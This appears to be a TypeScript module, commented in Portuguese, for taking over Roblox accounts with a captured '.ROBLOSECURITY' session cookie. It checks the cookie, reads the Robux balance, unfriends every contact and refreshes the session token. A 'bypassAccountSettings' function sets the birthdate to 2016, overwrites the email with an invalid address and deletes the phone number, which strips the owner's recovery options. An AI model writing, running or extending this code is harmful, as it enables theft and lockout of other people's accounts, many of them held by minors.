import axios from 'axios';

const ROBLOX_API = 'https://users.roblox.com';
const ROBLOX_AUTH_API = 'https://auth.roblox.com';
const ROBLOX_FRIENDS_API = 'https://friends.roblox.com';
const ROBLOX_ECONOMY_API = 'https://economy.roblox.com';
const ROBLOX_CATALOG_API = 'https://catalog.roblox.com';

export interface RobloxUser {
  id: string;
  name: string;
  displayName: string;
  description: string;
  created: string;
  isBanned: boolean;
  externalAppDisplayName: string | null;
  hasVerifiedBadge: boolean;
}

export interface RobloxAuthUser {
  userId: string;
  username: string;
  displayName: string;
  created: string;
  isBanned: boolean;
}

export interface RobloxAccountData {
  user: RobloxAuthUser;
  robux: number;
  premium: boolean;
  ageInDays: number;
  location: string;
  description: string;
  cookie: string;
}

export async function validateCookie(cookie: string): Promise<RobloxAuthUser> {
  try {
    const response = await axios.get(`${ROBLOX_AUTH_API}/v2/user`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      withCredentials: true,
    });

    const user = response.data;
    return {
      userId: String(user.id),
      username: user.name,
      displayName: user.displayName,
      created: user.created || new Date().toISOString(),
      isBanned: user.isBanned || false,
    };
  } catch (error: any) {
    throw new Error('Cookie inválido ou expirado');
  }
}

export async function getFullAccountData(cookie: string): Promise<RobloxAccountData> {
  try {
    // Obter informações do usuário
    const userResponse = await axios.get(`${ROBLOX_AUTH_API}/v2/user`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      withCredentials: true,
    });

    const user = userResponse.data;
    const userId = String(user.id);

    // Obter dados da conta (Robux, Premium, etc)
    let robux = 0;
    let premium = false;

    try {
      const accountResponse = await axios.get(`${ROBLOX_ECONOMY_API}/v1/user/${userId}/currency`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        },
        withCredentials: true,
      });
      robux = accountResponse.data.robux || 0;
    } catch (err) {
      console.error('Erro ao obter Robux:', err);
    }

    // Calcular idade da conta
    const createdDate = new Date(user.created);
    const now = new Date();
    const ageInDays = Math.floor((now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24));

    return {
      user: {
        userId,
        username: user.name,
        displayName: user.displayName,
        created: user.created,
        isBanned: user.isBanned || false,
      },
      robux,
      premium: premium,
      ageInDays,
      location: 'Unknown',
      description: user.description || 'Sem descrição',
      cookie,
    };
  } catch (error: any) {
    throw new Error(`Erro ao obter dados da conta: ${error.message}`);
  }
}

export async function searchUser(username: string): Promise<RobloxUser> {
  try {
    // Primeiro, buscar o ID do usuário
    const searchResponse = await axios.get(`${ROBLOX_API}/v1/usernames/users`, {
      params: {
        usernames: [username],
      },
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
    });

    if (!searchResponse.data.data || searchResponse.data.data.length === 0) {
      throw new Error('Usuário não encontrado');
    }

    const userId = searchResponse.data.data[0].id;

    // Buscar detalhes do usuário
    const userResponse = await axios.get(`${ROBLOX_API}/v1/users/${userId}`, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
    });

    return {
      id: String(userResponse.data.id),
      name: userResponse.data.name,
      displayName: userResponse.data.displayName,
      description: userResponse.data.description || '',
      created: userResponse.data.created,
      isBanned: userResponse.data.isBanned,
      externalAppDisplayName: userResponse.data.externalAppDisplayName || null,
      hasVerifiedBadge: userResponse.data.hasVerifiedBadge,
    };
  } catch (error: any) {
    throw new Error(`Erro ao buscar usuário: ${error.message}`);
  }
}

export async function removeFriends(cookie: string): Promise<number> {
  try {
    // Primeiro, obter lista de amigos
    const friendsResponse = await axios.get(`${ROBLOX_FRIENDS_API}/v1/my/friends`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      withCredentials: true,
    });

    const friends = friendsResponse.data.data || [];
    let removed = 0;

    // Remover cada amigo
    for (const friend of friends) {
      try {
        await axios.delete(`${ROBLOX_FRIENDS_API}/v1/users/${friend.id}/unfriend`, {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-CSRF-TOKEN': await getCsrfToken(cookie),
          },
          withCredentials: true,
        });
        removed++;
      } catch (err) {
        console.error(`Erro ao remover amigo ${friend.id}:`, err);
      }
    }

    return removed;
  } catch (error: any) {
    throw new Error(`Erro ao remover amigos: ${error.message}`);
  }
}

async function getCsrfToken(cookie: string): Promise<string> {
  try {
    const response = await axios.post(`${ROBLOX_AUTH_API}/v2/logout`, {}, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      withCredentials: true,
    });

    return response.headers['x-csrf-token'] || '';
  } catch (error: any) {
    if (error.response?.headers['x-csrf-token']) {
      return error.response.headers['x-csrf-token'];
    }
    return '';
  }
}

export async function refreshCookie(cookie: string): Promise<string> {
  try {
    // Fazer uma requisição que força o Roblox a gerar um novo cookie
    const response = await axios.post(
      `${ROBLOX_AUTH_API}/v2/login`,
      {},
      {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'X-CSRF-TOKEN': await getCsrfToken(cookie),
        },
        withCredentials: true,
      }
    );

    // Extrair novo cookie dos headers
    const setCookie = response.headers['set-cookie'];
    if (setCookie) {
      const newCookie = setCookie
        .find((c: string) => c.includes('.ROBLOSECURITY'))
        ?.split(';')[0]
        ?.replace('.ROBLOSECURITY=', '');
      if (newCookie) {
        return newCookie;
      }
    }

    throw new Error('Não foi possível gerar novo cookie');
  } catch (error: any) {
    throw new Error(`Erro ao refreshar cookie: ${error.message}`);
  }
}

export async function bypassAccountSettings(cookie: string): Promise<{
  ageChanged: boolean;
  emailInvalidated: boolean;
  phoneInvalidated: boolean;
  message: string;
}> {
  try {
    const userId = await getUserId(cookie);
    const results = {
      ageChanged: false,
      emailInvalidated: false,
      phoneInvalidated: false,
      message: '',
    };

    // Tentar mudar a idade
    try {
      await axios.post(
        `https://accountinformation.roblox.com/v1/birthdate`,
        {
          birthMonth: 1,
          birthDay: 1,
          birthYear: 2016, // Menos de 13 anos
        },
        {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-CSRF-TOKEN': await getCsrfToken(cookie),
            'Content-Type': 'application/json',
          },
          withCredentials: true,
        }
      );
      results.ageChanged = true;
    } catch (err) {
      console.error('Erro ao mudar idade:', err);
    }

    // Tentar remover/invalidar email
    try {
      await axios.post(
        `https://accountinformation.roblox.com/v1/email`,
        { emailAddress: 'invalid@invalid.invalid' },
        {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-CSRF-TOKEN': await getCsrfToken(cookie),
            'Content-Type': 'application/json',
          },
          withCredentials: true,
        }
      );
      results.emailInvalidated = true;
    } catch (err) {
      console.error('Erro ao invalidar email:', err);
    }

    // Tentar remover telefone
    try {
      await axios.delete(
        `https://accountinformation.roblox.com/v1/phone`,
        {
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-CSRF-TOKEN': await getCsrfToken(cookie),
          },
          withCredentials: true,
        }
      );
      results.phoneInvalidated = true;
    } catch (err) {
      console.error('Erro ao remover telefone:', err);
    }

    results.message = `Bypass realizado: Idade ${results.ageChanged ? '✓' : '✗'} | Email ${results.emailInvalidated ? '✓' : '✗'} | Telefone ${results.phoneInvalidated ? '✓' : '✗'}`;
    return results;
  } catch (error: any) {
    throw new Error(`Erro ao fazer bypass: ${error.message}`);
  }
}

async function getUserId(cookie: string): Promise<string> {
  const user = await validateCookie(cookie);
  return user.userId;
}

export async function getUserInfo(cookie: string): Promise<RobloxAuthUser> {
  return validateCookie(cookie);
}
